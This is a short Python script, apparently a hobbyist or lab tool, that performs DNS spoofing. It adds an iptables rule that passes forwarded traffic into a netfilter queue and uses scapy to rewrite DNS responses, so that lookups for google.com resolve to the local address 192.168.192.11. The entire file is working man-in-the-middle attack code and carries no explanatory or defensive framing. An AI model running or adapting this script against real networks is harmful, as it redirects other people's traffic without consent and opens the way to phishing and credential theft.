from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

# iface = "enp0s3"
iface = "enp7s0"

def dns_spoof():
    QUEUE_NUM = 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))

    nfqueue = NetfilterQueue()

    try:
        nfqueue.bind(QUEUE_NUM, process_packet)
        nfqueue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if (scapy_packet.haslayer(DNSRR)):
        print("DNS request for IP: " + str(scapy_packet.summary()))
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("Modified request for IP: " + str(scapy_packet.summary()))
        packet.set_payload(bytes(scapy_packet))

    packet.accept()

def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname == b"google.com.":
        packet[DNS].an = DNSRR(rrname=qname, rdata="192.168.192.11")

        packet[DNS].ancount = 1

        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum

    return packet

# def dns_sniff(packet):
    # if (packet.haslayer(DNS)):
        # print("DNS request for IP: " + str(packet.summary()))
        # try:
            # packet = modify_packet(packet)
        # except IndexError:
            # pass
        # print("Modified request for IP: " + str(packet.summary()))
    # # sendp(packet, iface)

dns_spoof()
